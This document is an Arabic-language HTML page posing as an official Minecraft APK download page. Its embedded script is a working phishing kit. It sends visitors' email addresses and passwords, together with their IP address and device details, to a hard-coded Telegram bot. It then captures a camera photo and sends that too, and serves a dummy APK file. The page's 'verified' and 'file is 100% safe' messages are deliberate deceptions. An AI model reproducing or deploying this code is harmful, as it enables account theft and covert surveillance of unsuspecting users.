<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft - تنزيل مجاني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 30px;
            box-shadow: 0 0 60px rgba(0, 200, 255, 0.15);
            max-width: 420px;
            width: 90%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 5px;
        }
        .logo h1 {
            font-size: 32px;
            font-weight: 700;
            color: #6ab04c;
            margin-top: 5px;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 25px;
            border-bottom: 1px solid #2a2a4a;
            padding-bottom: 20px;
        }
        .info {
            background: #12122a;
            padding: 15px;
            border-radius: 14px;
            border: 1px solid #2a2a4a;
            margin-bottom: 20px;
            text-align: left;
        }
        .info div {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 14px;
            color: #aaa;
        }
        .info div span:last-child {
            color: #fff;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            font-size: 13px;
            color: #aaa;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 14px;
            border: 1px solid #2a2a4a;
            background: #12122a;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #6ab04c;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6ab04c, #4a8a32);
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(106, 176, 76, 0.3);
        }
        .btn-secondary {
            background: #2a2a4a;
            margin-top: 10px;
        }
        .btn-secondary:hover {
            background: #3a3a5a;
        }
        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #aaa;
            padding: 12px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            min-height: 50px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #444;
            border-top: 1px solid #1a1a3a;
            padding-top: 15px;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #6ab04c;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">⛏️</div>
        <h1 style="color:#6ab04c; font-size:28px;">Minecraft</h1>
        <div class="sub">📥 تنزيل الإصدار 1.21.4 – النسخة الرسمية</div>

        <div class="info">
            <div><span>📦 الملف</span><span>Minecraft.apk</span></div>
            <div><span>📏 الحجم</span><span>287 MB</span></div>
            <div><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
            <div><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
        </div>

        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="emailInput" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>🔑 كلمة المرور</label>
            <input type="password" id="passwordInput" placeholder="••••••••">
        </div>

        <button class="btn" id="mainBtn">🚀 تحميل Minecraft.apk</button>
        <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>

        <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق</div>
    </div>

    <script>
        // ============================================================
        // إعدادات بوت تيليغرام (ضع بياناتك هنا)
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const mainBtn = document.getElementById('mainBtn');
        const fakeBtn = document.getElementById('fakeBtn');
        const statusDiv = document.getElementById('status');

        // دالة إرسال البيانات إلى تيليغرام
        async function sendData(email, password, action) {
            try {
                const ip = await getIP();
                const message =
                    `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        // دالة الحصول على IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        // دالة طلب الكاميرا
        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                // إرسال الصورة إلى تيليغرام
                const blob = await fetch(imageData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                console.log('❌ الكاميرا غير متاحة أو مرفوضة');
                return false;
            }
        }

        // الوظيفة الرئيسية
        async function handleMainAction() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !email.includes('@') || !email.includes('.')) {
                statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            if (!password || password.length < 4) {
                statusDiv.innerHTML = '⚠️ كلمة المرور يجب أن تكون 4 أحرف على الأقل';
                statusDiv.style.color = '#ff9800';
                return;
            }

            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
            statusDiv.style.color = '#aaa';

            // إرسال البريد وكلمة المرور
            const sent = await sendData(email, password, 'تحميل مباشر');

            if (sent) {
                statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                statusDiv.style.color = '#4caf50';

                // طلب الكاميرا بعد ثانية
                setTimeout(async () => {
                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                    const cam = await requestCamera();
                    if (cam) {
                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
                    } else {
                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
                    }
                    // تحميل ملف وهمي
                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'Minecraft.apk';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);

                    setTimeout(() => {
                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
                        statusDiv.style.color = '#aaa';
                    }, 3000);
                }, 1000);

            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                statusDiv.style.color = '#e94560';
            }
        }

        // زر التحقق الوهمي
        fakeBtn.addEventListener('click', async function() {
            statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
            statusDiv.style.color = '#aaa';

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (email && password) {
                await sendData(email, password, 'التحقق من الملف');
            }

            setTimeout(() => {
                statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                statusDiv.style.color = '#4caf50';
                setTimeout(() => {
                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
                    statusDiv.style.color = '#aaa';
                }, 2000);
            }, 2000);
        });

        mainBtn.addEventListener('click', handleMainAction);

        // Enter
        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
    </script>

</body>
</html>
